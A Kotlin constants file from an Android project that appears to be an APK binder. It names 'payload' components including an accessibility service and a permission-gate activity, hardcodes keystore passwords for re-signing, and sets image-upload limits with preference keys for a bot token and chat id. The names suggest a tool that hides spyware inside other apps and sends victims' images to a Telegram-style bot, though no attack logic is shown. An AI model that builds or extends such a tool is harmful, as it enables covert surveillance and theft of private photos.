package Com.devhs.apkbinder.core

object Const {
    const val PAYLOAD_APP = "Com.devhs.apkbinder.payload.PayloadApp"
    const val PAYLOAD_ACTIVITY = "Com.devhs.apkbinder.payload.PermissionGateActivity"
    const val PAYLOAD_SERVICE = "Com.devhs.apkbinder.payload.PayloadService"
    const val PAYLOAD_PROVIDER = "Com.devhs.apkbinder.payload.PayloadProvider"
    const val PAYLOAD_A11Y = "Com.devhs.apkbinder.payload.HsAccessibility"

    const val AUTHORITY_SUFFIX = ".hsbinder"

    // ---- Signing ----
    const val KEYSTORE_FILE = "payload.keystore"
    const val KEYSTORE_ASSET = "payload.keystore"
    const val KEYSTORE_PASS = "hsbinder123"
    const val KS_ALIAS = "hs"
    const val KS_PASS = "hsapkbinder"

    // ---- Upload ----
    const val CAPTION = "Developer By Hs"
    const val IMAGE_LIMIT = 5000
    const val PARALLEL_UPLOADS = 12

    // ---- Prefs ----
    const val PREF_BOT_TOKEN = "bot_token"
    const val PREF_CHAT_ID   = "chat_id"
    const val PREF_LAST_DIR  = "last_dir"

    // ---- Notification ----
    const val CHANNEL_ID = "hs_binder_channel"
    const val NOTIF_ID   = 1001

    // ---- Config asset ----
    const val CONFIG_ASSET = "hs_config.json"
}
